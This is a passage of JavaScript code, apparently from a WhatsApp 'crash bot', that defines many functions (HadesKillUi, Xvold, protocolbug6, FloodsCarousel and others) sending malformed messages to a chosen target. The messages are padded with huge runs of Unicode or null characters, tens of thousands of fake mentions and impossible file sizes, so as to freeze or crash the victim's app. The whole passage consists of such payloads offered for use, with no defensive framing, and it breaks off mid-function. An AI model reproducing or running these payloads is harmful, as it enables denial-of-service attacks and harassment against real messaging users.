                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                fileName: "Lalapo Bot",
                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1724474503",
                contactVcard: true,
                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                jpegThumbnail: "",
              },
            },
          },
        },
      },
    },
  };

  await Ryuu.relayMessage(jid, message, { participant: { jid: target } });
}


async function HadesKillUi(target, Ptcp = true) {
      await Ryuu.relayMessage(
        target,
        {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 1316134911,
                    mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                    fileName: "⿻",
                    fileEncSha256:
                      "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                    directPath:
                      "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1726867151",
                    contactVcard: true,
                    jpegThumbnail: 'https://files.catbox.moe/mgnwmg.jpg',
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text: "Viscount Strike ui..\n" + "ꦾ".repeat(28000),
                },
                nativeFlowMessage: {
                  messageParamsJson: "{}",
                },
                contextInfo: {
                  mentionedJid: [target, "6289526156543@s.whatsapp.net"],
                  forwardingScore: 1,
                  isForwarded: true,
                  fromMe: false,
                  participant: "0@s.whatsapp.net",
                  remoteJid: "status@broadcast",
                  quotedMessage: {
                    documentMessage: {
                      url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mimetype:
                        "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                      fileSha256:
                        "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                      fileLength: "9999999999999",
                      pageCount: 1316134911,
                      mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                      fileName: "Дѵөҫдԁө Ԍҵдѵд tђคเlคภ๔",
                      fileEncSha256:
                        "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                      directPath:
                        "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1724474503",
                      contactVcard: true,
                      thumbnailDirectPath:
                        "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                      thumbnailSha256:
                        "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                      thumbnailEncSha256:
                        "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                      jpegThumbnail: "",
                    },
                  },
                },
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }

async function VampPrivateBlank(target) {
  const Vampire = `_*~@2~*_\n`.repeat(10500);
  const Private = 'ꦽ'.repeat(5000);

  const message = {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 1316134911,
              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
              fileName: "Pembasmi Kontol",
              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1726867151",
              contactVcard: true,
              jpegThumbnail: null,
            },
            hasMediaAttachment: true,
          },
          body: {
            text: '(#)- Undefined' + Vampire + Private,
          },
          footer: {
            text: '',
          },
          contextInfo: {
            mentionedJid: [
              "15056662003@s.whatsapp.net",
              ...Array.from(
                { length: 30000 },
                () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            forwardingScore: 1,
            isForwarded: true,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                fileName: "Lalapo Bot",
                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1724474503",
                contactVcard: true,
                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                jpegThumbnail: "",
              },
            },
          },
        },
      },
    },
  };

  await Ryuu.relayMessage(jid, message, { participant: { jid: target } });
}

async function multiscorpio(target, stats) {
    const overButton = Array.from({ length: 9696 }, (_, r) => ({
        title: "᭄".repeat(9696),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }))

    const gluncherOfDelay = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "RyuuX",
                    listType: 2,
                    buttonText: null,
                    sections: overButton,
                    singleSelectReply: { selectedRowId: "🪅" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 9696 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9696,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "9696@newsletter",
                            serverMessageId: 1,
                            newsletterName: "----default"
                        }
                    },
                    description: "( 🥷 )"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    }

    const delayInstantStatus = generateWAMessageFromContent(target, gluncherOfDelay, {})

    await Ryuu.relayMessage("status@broadcast", delayInstantStatus.message, {
        messageId: delayInstantStatus.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    })

    if (stats) {
        await Ryuu.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: delayInstantStatus.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "hello" },
                        content: undefined
                    }
                ]
            }
        )
    }
}

async function Xvold(target, mention) {
const Voldx = [
        {
            attrs: { biz_bot: '1' },
            tag: "meta",
        },
        {
            attrs: {},
            tag: "biz",
        },
    ];
const delaymention = Array.from({ length: 30000 }, (_, r) => ({
        title: "᭡꧈".repeat(95000),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));
 
const quotedMessage = {
    extendedTextMessage: {
        text: "᭯".repeat(12000),
        matchedText: "https://" + "ꦾ".repeat(500) + ".com",
        canonicalUrl: "https://" + "ꦾ".repeat(500) + ".com",
        description: "\u0000".repeat(500),
        title: "\u200D".repeat(1000),
        previewType: "NONE",
        jpegThumbnail: Buffer.alloc(10000), 
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            externalAdReply: {
                showAdAttribution: true,
                title: "AnosXVold",
                body: "\u0000".repeat(10000),
                thumbnailUrl: "https://" + "ꦾ".repeat(630) + ".com",
                mediaType: 1,
                renderLargerThumbnail: true,
                sourceUrl: "https://" + "𓂀".repeat(2000) + ".xyz"
            },
            mentionedJid: Array.from({ length: 1000 }, (_, i) => `${Math.floor(Math.random() * 1000000000)}@s.whatsapp.net`)
        }
    },
    paymentInviteMessage: {
        currencyCodeIso4217: "USD",
        amount1000: "999999999",
        expiryTimestamp: "9999999999",
        inviteMessage: "Payment Invite" + "💥".repeat(1770),
        serviceType: 1
    }
};
 const message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };
let buttonsMessage = {
            text: "᭯".repeat(9741),
            contentText: "\u0000",
            footerText: "\u0000",
            buttons: [
                {
                    buttonId: "\u0000".repeat(911000),
                    buttonText: { displayText: "\u0000" + "\u0000".repeat(400000) },
                    type: 1,
                    headerType: 1,
                }, 
                {
                    text: "❦",
                    contentText:
                        "Untukmu 2000tahun yang akan datang",
                    footerText: "darimu 2000tahun yang lalu",
                    buttons: [
                        {
                            buttonId: ".anos",
                            buttonText: {
                                displayText: "Anos is maou" + "\u0000".repeat(500000),
                            },
                            type: 1,

}
                    ],
                    headerType: 1,
                },
                
           ]};
                       
const mentionedList = [
"13135550002@s.whatsapp.net",
...Array.from({ length: 40000 }, () =>
`1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
)
];

const MSG = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "Vold Delay",
listType: 2,
buttonText: null,
sections: delaymention,
singleSelectReply: { selectedRowId: "🔴" },
contextInfo: {
mentionedJid: Array.from({ length: 30000 }, () => 
"1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
),
participant: target,
remoteJid: "status@broadcast",
forwardingScore: 9741,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "333333333333@newsletter",
serverMessageId: 1,
newsletterName: "-"
}
},
description: "Ciett Delayyyy"
}
}
},
contextInfo: {
channelMessage: true,
statusAttributionType: 2
}
};         


const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".RaldzzXyz" + "ោ៝".repeat(10000),
        title: "PhynixAgency",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://n.uguu.se/BvbLvNHY.jpg",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "109951162777600",
        seconds: 999999,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "ꦾ".repeat(12777),
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
           externalAdReply: {
              showAdAttribution: true,
              title: `☠️ - んジェラルド - ☠️`,
              body: `${"\u0000".repeat(9117)}`,
              mediaType: 1,
              renderLargerThumbnail: true,
              thumbnailUrl: null,
              sourceUrl: `https://${"ꦾ".repeat(100)}.com/`
        },
           businessMessageForwardInfo: {
              businessOwnerJid: target,
        },
            quotedMessage: quotedMessage,
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: `${"ꦾ".repeat(100)}`
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };  {};

const msg = generateWAMessageFromContent(target, message, delaymention, Voldx, {});

    await Ryuu.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await Ryuu.relayMessage(target, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}

async function Delaymonth(target, mention) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: "Undefined Invisible Ryuu",
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769",
                    height: 354,
                    width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    await Ryuu.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await Ryuu.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "Month Crash" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

async function delayinvisi(target) {
    const delaymention = Array.from({ length: 9741 }, (_, r) => ({
        title: "᭯".repeat(9741),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "You? Love me",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: { selectedRowId: "☠️" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 9741 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "9741@newsletter",
                            serverMessageId: 1,
                            newsletterName: "-"
                        }
                    },
                    description: "( # ) "
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(target, MSG, {});

    await Ryuu.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });
}

async function protocolbug6(isTarget, mention) {
  let msg = await generateWAMessageFromContent(isTarget, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32)
        },
        interactiveResponseMessage: {
          body: {
            text: "Ryuu Is Here",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "TREDICT INVICTUS", 
            paramsJson: "\u0000".repeat(999999),
            version: 3
          },
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9741,
            forwardedNewsletterMessageInfo: {
              newsletterName: "trigger newsletter ( @tamainfinity )",
              newsletterJid: "120363321780343299@newsletter",
              serverMessageId: 1
            }
          }
        }
      }
    }
  }, {});

  await Ryuu.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: isTarget }, content: undefined }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await Ryuu.relayMessage(isTarget, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            type: 25
          },
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂" },
              content: undefined
            }
          ]
        }
      }
    }, {});
  }
}

async function Carouselforcex(target) {
      const buttonMessage = "spinhies"+"シャタ";
      await Ryuu.relayMessage(
        target,
        {
          ephemeralMessage: {
            message: {
              viewOnceMessage: {
                message: {
                  interactiveMessage: {
                    header: {
                      title: (buttonMessage + "ꦾ").repeat(50000),
                      locationMessage: {},
                      hasMediaAttachment: true,
                    },
                    body: {
                      text: "\0" + "ꦾ".repeat(90000),
                    },
                    nativeFlowMessage: {
                      name: "call_permission_request",
                      messageParamsJson: buttonMessage,
                    },
                    carouselMessage: {},
                  },
                },
              },
            },
          },
        },
        Pctp
          ? {
              participant: {
                jid:target,
              },
            }
          : {}
      );
    }

async function CosmoBlank(target, ptcp = true) {
  const Ryuu = `_*~@8~*_\n`.repeat(10500);
  const Nenen = 'ꦽ'.repeat(55555);

  await Ryuu.relayMessage(
    target,
    {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                fileName: "Xnxx.com",
                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1726867151",
                contactVcard: true,
                jpegThumbnail: null,
              },
              hasMediaAttachment: true,
            },
            body: {
              text: 'Ryuu👺👺' + Nenen + Ryuu,
            },
            footer: {
              text: '',
            },
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 30000 },
                  () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                ),
              ],
              forwardingScore: 1,
              isForwarded: true,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                  fileName: "Xnxx.com",
                  fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                  directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1724474503",
                  contactVcard: true,
                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: "",
                },
              },
            },
          },
        },
      },
    },
    ptcp
      ? {
          participant: {
            jid: target,
          },
        }
      : {}
  );
}

async function FloodsCarousel(target, Ptcp = true) {
const header = {
locationMessage: {
degreesLatitude: 0,
degreesLongitude: 0,
},
hasMediaAttachment: true,
};
const body = {
text: "♦️ 𝐑͢𝐲͡𝐮𝐮𝐒͜𝐭𝐫͢𝐢͡𝐤𝐞 ♦️" + "᭯".repeat(90000),
};
const carouselMessage = {
sections: [
{
title: "\u200C".repeat(90000),
rows: [
{ title: "\u200D".repeat(90000), description: "\u200D".repeat(90000), rowId: "\u200D".repeat(90000) },
{ title: "\u200D".repeat(90000), description: "\u200D".repeat(90000), rowId: "\u200D".repeat(90000) },
],
},
{
title: "\u200c".repeat(90000),
rows: [
{ title: "\u200D".repeat(90000), description: "\u200D".repeat(90000), rowId: "\u200D".repeat(90000) },
{ title: "\u200D".repeat(90000), description: "\u200D".repeat(90000), rowId: "\u200D".repeat(90000) },
],
},
{
title: "\u200c".repeat(90000),
rows: [
{ title: "\u200D".repeat(90000), description: "\u200D".repeat(90000), rowId: "\u200D".repeat(90000) },
{ title: "\u200D".repeat(90000), description: "\u200D".repeat(90000), rowId: "\u200D".repeat(90000) },
],
},
{
title: "\u200c".repeat(90000),
rows: [
{ title: "\u200D".repeat(90000), description: "\u200D".repeat(90000), rowId: "\u200D".repeat(90000) },
{ title: "\u200D".repeat(90000), description: "\u200D".repeat(90000), rowId: "\u200D".repeat(90000) },
],
},
],
};
await Ryuu.relayMessage(target, {
ephemeralMessage: {
message: {
interactiveMessage: {
header: header,
body: body,
carouselMessage: carouselMessage,
},
},
},
}, Ptcp ? { participant: { jid: target } } : { quoted: null });
}

async function bulldozer(sock, targetNumber) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
